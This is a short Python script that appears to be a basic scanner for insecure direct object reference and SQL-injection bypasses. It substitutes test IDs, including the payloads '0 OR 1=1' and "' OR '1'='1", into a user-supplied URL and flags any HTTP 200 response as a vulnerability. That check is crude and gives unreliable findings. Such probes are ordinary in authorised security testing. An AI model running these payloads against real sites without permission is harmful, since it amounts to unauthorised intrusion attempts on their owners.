import requests

# List of test primary key values
TEST_IDS = ["1", "9999", "-1", "0 OR 1=1", "' OR '1'='1", "admin", "superuser"]

def check_sql_primary_key_bypass(target_url):
    print(f"[*] Checking for authorization bypass at {target_url}...")

    for test_id in TEST_IDS:
        test_url = target_url.replace("{{ID}}", test_id)  # Replace placeholder with test ID
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(f"[!] Possible Vulnerability: Access granted for ID {test_id} -> {test_url}")
            else:
                print(f"[-] No unauthorized access for ID {test_id}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error accessing {test_url}: {e}")

# Get user input
target_url = input("Enter the target URL with {{ID}} placeholder (e.g., https://example.com/user?id={{ID}}): ")
check_sql_primary_key_bypass(target_url)
